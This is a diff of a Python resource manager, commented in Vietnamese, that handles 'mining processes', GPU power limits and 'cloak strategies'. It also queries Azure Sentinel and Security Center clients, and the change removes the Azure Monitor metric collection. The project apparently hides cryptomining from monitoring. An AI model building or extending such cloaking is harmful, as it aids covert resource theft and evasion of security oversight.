@@ -15,13 +15,13 @@ from typing import List, Any, Dict, Optional
 from readerwriterlock import rwlock
 from itertools import count
 
-
 from .base_manager import BaseManager
 from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
 
+# Đã bỏ AzureMonitorClient import, vì không còn dùng
 from .azure_clients import (
-    AzureMonitorClient,
+    # AzureMonitorClient,        <--- Bỏ
     AzureSentinelClient,
     AzureLogAnalyticsClient,
     AzureSecurityCenterClient,
@@ -33,7 +33,6 @@ from .azure_clients import (
 )
 
 from .auxiliary_modules import temperature_monitor
-
 from .auxiliary_modules.power_management import (
     get_cpu_power,
     get_gpu_power,
@@ -218,7 +217,6 @@ class SharedResourceManager:
             pynvml.nvmlInit()
             handle = pynvml.nvmlDeviceGetHandleByIndex(0)
 
-            # Chuyển đổi đơn vị nếu cần thiết
             if unit.lower() == 'mw':
                 power_limit_mw = power_limit
             elif unit.lower() == 'w':
@@ -227,31 +225,26 @@ class SharedResourceManager:
                 raise ValueError(f"Đơn vị không hợp lệ: {unit}. Chỉ hỗ trợ 'W' và 'mW'.")
 
             self.logger.debug(f"Converted power_limit to mW: {power_limit_mw} mW")
-
-            # Lấy giới hạn năng lượng hợp lệ
             min_limit, max_limit = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
             self.logger.debug(f"GPU power limit constraints: min={min_limit} mW, max={max_limit} mW")
 
-            # Kiểm tra nếu `power_limit` nằm ngoài phạm vi hợp lệ
             if not (min_limit <= power_limit_mw <= max_limit):
                 raise ValueError(
                     f"Power limit {power_limit}{unit} không hợp lệ. "
                     f"Khoảng hợp lệ: {min_limit // 1000}W - {max_limit // 1000}W."
                 )
 
-            # Áp dụng giới hạn năng lượng
             pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit_mw)
             self.logger.info(
                 f"Set GPU power limit={power_limit}{unit} cho {process_name} (PID={pid})."
             )
-            return True  # Trả về thành công
+            return True
         except pynvml.NVMLError as e:
             self.logger.error(
                 f"Lỗi NVML khi set GPU power limit cho {process_name} (PID={pid}): {e}. "
                 f"Power limit yêu cầu: {power_limit}{unit}."
             )
         except ValueError as ve:
-            # Log trực tiếp thông báo ngoại lệ mà không lặp lại "Khoảng hợp lệ"
             self.logger.error(f"Lỗi giá trị power limit: {ve}")
         except Exception as e:
             self.logger.error(
@@ -260,7 +253,7 @@ class SharedResourceManager:
         finally:
             pynvml.nvmlShutdown()
 
-        return False  # Trả về thất bại nếu gặp lỗi
+        return False
 
     def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
         try:
@@ -316,21 +309,8 @@ class SharedResourceManager:
             )
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
-        """
-        Apply a cloaking strategy to a given process.
-
-        Args:
-            strategy_name (str): Name of the cloaking strategy (e.g., 'cpu', 'gpu').
-            process (MiningProcess): The process to which the strategy will be applied.
-
-        Raises:
-            Exception: If the strategy cannot be created or applied.
-        """
         try:
-            # Log việc tạo strategy
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {process.name} (PID={process.pid})")
-
-            # Tạo chiến lược từ factory
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
@@ -338,22 +318,15 @@ class SharedResourceManager:
                 self.is_gpu_initialized()
             )
 
-            # Kiểm tra chiến lược có hợp lệ không
             if not strategy:
                 self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
-                return  # Không ném ngoại lệ để tránh ngắt luồng chính
+                return
             if not callable(getattr(strategy, 'apply', None)):
                 self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
-                return  # Không ném ngoại lệ để tránh ngắt luồng chính
+                return
 
-            # Log thông tin chiến lược
-            self.logger.debug(f"Strategy class: {strategy.__class__.__name__}, methods: {dir(strategy)}")
-
-            # Áp dụng chiến lược với cơ chế thử lại
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {process.name} (PID={process.pid})")
             adjustments = self._safe_apply_strategy(strategy, process)
-
-            # Xử lý các điều chỉnh trả về
             if adjustments:
                 self.logger.info(f"Áp dụng '{strategy_name}' => {adjustments} cho {process.name} (PID={process.pid}).")
                 self.execute_adjustments(adjustments, process)
@@ -367,16 +340,6 @@ class SharedResourceManager:
             raise
 
     def _safe_apply_strategy(self, strategy: CloakStrategy, process: MiningProcess) -> Optional[Dict[str, Any]]:
-        """
-        Safely apply a cloaking strategy and handle errors.
-
-        Args:
-            strategy (CloakStrategy): The cloaking strategy to apply.
-            process (MiningProcess): The process to which the strategy will be applied.
-
-        Returns:
-            Optional[Dict[str, Any]]: Adjustments returned by the strategy, or None if an error occurs.
-        """
         try:
             adjustments = strategy.apply(process)
             if not isinstance(adjustments, dict):
@@ -465,7 +428,6 @@ class ResourceManager(BaseManager):
     _instance = None
     _instance_lock = Lock()
 
-
     def __new__(cls, *args, **kwargs):
         with cls._instance_lock:
             if cls._instance is None:
@@ -491,7 +453,7 @@ class ResourceManager(BaseManager):
         self.mining_processes_lock = rwlock.RWLockFair()
         self._counter = count()
 
-        # Azure
+        # Azure (đã bỏ AzureMonitorClient)
         self.initialize_azure_clients()
         self.discover_azure_resources()
 
@@ -539,7 +501,8 @@ class ResourceManager(BaseManager):
         self.resource_adjustment_thread.join()
 
     def initialize_azure_clients(self):
-        self.azure_monitor_client = AzureMonitorClient(self.logger)
+        # Bỏ AzureMonitorClient
+        # self.azure_monitor_client = AzureMonitorClient(self.logger)
         self.azure_sentinel_client = AzureSentinelClient(self.logger)
         self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
         self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
@@ -551,10 +514,11 @@ class ResourceManager(BaseManager):
 
     def discover_azure_resources(self):
         try:
-            self.vms = self.azure_monitor_client.discover_resources(
-                'Microsoft.Compute/virtualMachines'
-            )
-            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
+            # Bỏ khám phá VM qua azure_monitor_client
+            # self.vms = self.azure_monitor_client.discover_resources(
+            #     'Microsoft.Compute/virtualMachines'
+            # )
+            # self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")
 
             self.network_watchers = self.azure_network_watcher_client.discover_resources(
                 'Microsoft.Network/networkWatchers'
@@ -640,8 +604,7 @@ class ResourceManager(BaseManager):
                 for p in self.mining_processes:
                     self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)
 
-                if self.should_collect_azure_monitor_data():
-                    self.collect_azure_monitor_data()
+                # Đã bỏ logic gọi collect_azure_monitor_data, vì hàm này cũng bị xóa
 
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")
@@ -714,39 +677,8 @@ class ResourceManager(BaseManager):
         except Exception as e:
             self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")
 
-    def should_collect_azure_monitor_data(self) -> bool:
-        if not hasattr(self, '_last_azure_monitor_time'):
-            self._last_azure_monitor_time = 0
-        now = int(time())
-        interval = self.config.get("monitoring_parameters", {}).get("azure_monitor_interval_seconds", 300)
-        if now - self._last_azure_monitor_time >= interval:
-            self._last_azure_monitor_time = now
-            return True
-        return False
-
-    def collect_azure_monitor_data(self):
-        """
-        Thu thập dữ liệu giám sát từ Azure Monitor.
-        Ghi log chi tiết khi gặp lỗi, bao gồm thông tin VM.
-        """
-        try:
-            for vm in self.vms:
-                try:
-                    rid = vm.get('id', 'Unknown ID')
-                    name = vm.get('name', 'Unknown Name')
-                    metric_names = ['Percentage CPU', 'Available Memory Bytes']
-                    metrics = self.azure_monitor_client.get_metrics(rid, metric_names)
-                    self.logger.info(f"Thu thập chỉ số VM '{name}' (ID: {rid}): {metrics}")
-                except Exception as vm_error:
-                    self.logger.error(
-                        f"Lỗi khi thu thập chỉ số cho VM '{vm.get('name', 'Unknown Name')}' (ID: {vm.get('id', 'Unknown ID')}): {vm_error}\n"
-                        f"Stack Trace:\n{traceback.format_exc()}"
-                    )
-        except Exception as e:
-            self.logger.critical(
-                f"Lỗi nghiêm trọng trong collect_azure_monitor_data: {e}\n"
-                f"Stack Trace:\n{traceback.format_exc()}"
-            )
+    # Đã xóa hàm should_collect_azure_monitor_data
+    # Đã xóa hàm collect_azure_monitor_data
 
     def optimize_resources(self):
         opt_intv = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
@@ -836,7 +768,6 @@ class ResourceManager(BaseManager):
     def resource_adjustment_handler(self):
         while not self.stop_event.is_set():
             try:
-                # Lấy mục từ hàng đợi với bộ đếm
                 item = self.resource_adjustment_queue.get(timeout=1)
                 
                 if len(item) != 3:
@@ -952,7 +883,6 @@ class ResourceManager(BaseManager):
             net_bw_limit_mbps = float(action[next_idx + 1])
             cache_limit_percent = float(action[next_idx + 2])
 
-            # Tasks
             t1 = {
                 'function': 'adjust_cpu_threads',
                 'args': (process.pid, cpu_threads, process.name)
@@ -997,7 +927,7 @@ class ResourceManager(BaseManager):
             self.logger.error(
                 f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-     
+
     def allocate_resources_with_priority(self):
         """
         Phân bổ tài nguyên (CPU threads) theo priority.
@@ -1026,7 +956,6 @@ class ResourceManager(BaseManager):
                     avb = total_cores - allocated
                     needed = min(p.priority, avb)
                     
-                    # Lấy giá trị từ bộ đếm để đảm bảo độ ưu tiên duy nhất
                     count_val = next(self._counter)
                     
                     adjustment_task = {
